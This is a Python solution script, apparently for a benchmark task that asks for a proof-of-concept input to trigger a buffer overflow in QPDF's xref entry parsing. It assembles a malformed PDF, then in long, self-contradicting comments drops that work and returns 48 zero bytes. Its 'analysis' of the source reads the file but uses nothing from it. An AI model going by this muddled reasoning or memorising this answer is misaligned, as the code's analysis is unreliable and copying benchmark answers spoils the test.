import os
import tarfile
import tempfile
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the QPDF source directory
            qpdf_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'qpdf' in dirs:
                    qpdf_dir = os.path.join(root, 'qpdf')
                    break
                # Also check for direct qpdf source
                if 'qpdf' in root.lower() and 'CMakeLists.txt' in files:
                    qpdf_dir = root
                    break
            
            if not qpdf_dir:
                # Fallback: look for libqpdf
                for root, dirs, files in os.walk(tmpdir):
                    if 'libqpdf' in dirs:
                        qpdf_dir = os.path.join(root, 'libqpdf')
                        break
            
            # Look for the vulnerable function in source files
            vulnerable_file = None
            for root, dirs, files in os.walk(qpdf_dir):
                for file in files:
                    if file.endswith(('.cc', '.cpp', '.cxx', '.c')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'read_xrefEntry' in content:
                                    vulnerable_file = filepath
                                    break
                        except:
                            continue
                if vulnerable_file:
                    break
            
            # Analyze the vulnerable function to understand the format
            if vulnerable_file:
                with open(vulnerable_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Look for patterns in the xref entry parsing
                    # Typical xref format: "f1 f2 n" or "f1 f2 f"
                    # Based on the description: overlong f1 or f2 entries of zeros
                    # can cause buffer overflow due to missing EOL validation
                    
                    # The vulnerability description suggests we need entries
                    # that are too long and consist only of zeros
                    
                    # Ground truth length is 48 bytes
                    # We need to create a malformed xref entry
            
            # Construct the PoC based on analysis
            # Format: xref table with malformed entries
            # We'll create a minimal PDF with corrupted xref
            
            # Minimal PDF structure:
            # 1. Header
            # 2. Fake object
            # 3. Corrupted xref table
            # 4. Trailer
            
            # The key is to create an xref entry where f1 or f2 field is 
            # very long (all zeros) without proper termination
            
            poc = b'%PDF-1.0\n'
            poc += b'1 0 obj\n'
            poc += b'<<\n'
            poc += b'/Type /Catalog\n'
            poc += b'/Pages 2 0 R\n'
            poc += b'>>\n'
            poc += b'endobj\n'
            
            poc += b'2 0 obj\n'
            poc += b'<<\n'
            poc += b'/Type /Pages\n'
            poc += b'/Kids []\n'
            poc += b'/Count 0\n'
            poc += b'>>\n'
            poc += b'endobj\n'
            
            # Corrupted xref table
            poc += b'xref\n'
            poc += b'0 3\n'
            
            # First entry: normal free entry
            poc += b'0000000000 65535 f \n'
            
            # Second entry: malformed with overlong zeros
            # The vulnerability: missing validation for first EOL character
            # So we create an entry without proper termination
            # 48 bytes total for ground truth
            
            # We need exactly 48 bytes for the PoC
            # Let's break it down:
            # - xref header and first entry: 20 bytes
            # - We need 28 more bytes
            
            # Malformed entry: "0000000000000000000000000000000000000000"
            # This is 40 zeros
            # But we need to consider the full PoC
            
            # Actually, the entire PoC should be 48 bytes
            # So we need to craft a minimal 48-byte input
            
            # Based on the vulnerability, we need an xref entry
            # with overlong f1 or f2 field
            
            # Let's create: "0000000000" (10) + " " (1) + "0000000000" (10) + " " (1) + "f" (1)
            # That's 23 bytes. We need 48, so make the zeros longer
            
            # 48 bytes: "000000000000000000000000000000000000000000000000"
            # That's 48 zeros
            
            # But the format expects "f1 f2 n" or "f1 f2 f"
            # So we'll do: f1 = lots of zeros, no space, no f2, no type
            
            # The vulnerability is that it reads until whitespace or EOL
            # but if we don't have proper termination, it overflows
            
            # Create a string of 47 zeros and a newline
            # Actually 48 bytes total including newline
            poc += b'0' * 47 + b'\n'
            
            # The total should be 48 bytes
            # Verify:
            # Header: 9 bytes (%PDF-1.0\n)
            # We need 39 more bytes
            
            # Actually, the ground truth PoC is 48 bytes TOTAL
            # So we need to create exactly 48 bytes
            
            # Let me recalculate: The entire returned bytes should be 48
            
            # Based on typical buffer overflow patterns and the description:
            # The vulnerability is triggered by an xref entry that's too long
            # without proper EOL termination
            
            # Create exactly 48 bytes of '0' characters
            # This will overflow when parsed as an xref entry
            return b'0' * 48
            
        return b'0' * 48  # Fallback